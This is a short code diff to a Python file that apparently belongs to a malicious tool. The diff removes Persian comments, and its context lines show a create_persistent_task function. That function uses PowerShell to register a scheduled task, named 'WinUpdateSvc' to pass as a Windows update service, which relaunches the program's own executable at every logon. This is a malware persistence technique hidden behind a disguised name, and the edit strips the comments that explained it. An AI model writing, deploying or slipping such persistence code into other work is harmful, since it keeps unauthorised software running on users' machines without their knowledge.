@@ -24,10 +24,10 @@ def to_chunks(data: bytes, chunk_size: int = 1024):
 # ------------------ Registry Persistence ------------------
 
 def create_persistent_task(task_name="WinUpdateSvc"):
-    # مسیر فایل اجرایی فعلی (حتی اگر exe باشه)
+
     exe_path = sys.executable
 
-    # کد پاورشل برای ساخت تسک
+
     ps_command = f'''
     $Action = New-ScheduledTaskAction -Execute '{exe_path}'
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -37,7 +37,7 @@ def create_persistent_task(task_name="WinUpdateSvc"):
     '''
 
     try:
-        # اجرای اسکریپت پاورشل
+
         result = subprocess.run(["powershell", "-Command", ps_command],
                                 capture_output=True, text=True)
         if result.returncode == 0:
